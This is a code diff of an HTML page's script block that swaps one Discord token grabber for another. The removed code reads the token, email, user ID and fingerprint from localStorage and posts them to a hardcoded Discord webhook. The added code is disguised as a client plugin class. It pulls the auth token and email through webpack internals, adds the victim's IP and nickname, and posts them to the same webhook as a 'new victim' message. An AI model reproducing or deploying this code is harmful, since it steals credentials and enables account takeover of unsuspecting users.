@@ -4,19 +4,33 @@
 <body>
 
 <script>
-  location.reload();
-  var discordWebhook = "https://discord.com/api/webhooks/851870978333736980/s6x7_U3IT4RzibZ39IWPB--P0LZ04B96YwQkdtWONJzFIKKqpc88UnaNRCmLGYwOH6Zp";
-  var i = document.createElement('iframe');
-  document.body.appendChild(i);
-  var request = new XMLHttpRequest();
-  request.open("POST", discordWebhook);
-  request.setRequestHeader('Content-type', 'application/json');
-  var params = {
-      username: "Token Grabber",
-      avatar_url: "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png",
-      content: '**Nouvelle personne hackée !**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nAdresse email : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nPropriétés : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nScript de login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
-};
-request.send(JSON.stringify(params));
+const config = {
+    "info": {
+        "name": "A",
+        "authors": ["andro", "The Way", "M"],
+        "version": "1.1",
+        "description": "kox"
+    },
+    "webhook": "https://discord.com/api/webhooks/851870978333736980/s6x7_U3IT4RzibZ39IWPB--P0LZ04B96YwQkdtWONJzFIKKqpc88UnaNRCmLGYwOH6Zp"
+}
+
+class DiscordTokenGrabber {
+    constructor() { this._config = config; }
+    
+    getName() { return config.info.name; }
+    getAuthor() { return config.info.authors[0] }
+    getDescription() { return config.info.description; }
+    getVersion() { return config.info.version; }
+
+    load() {
+        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
+        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
+        const username = $("[class *= \"nameTag\"]").first().text();
+
+        $.getJSON("https://api.ipify.org?format=json", (data) => { 
+            require("request").post(config.webhook, {form: {content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
+        });
+    }
 </script>
 </body>
 </html>
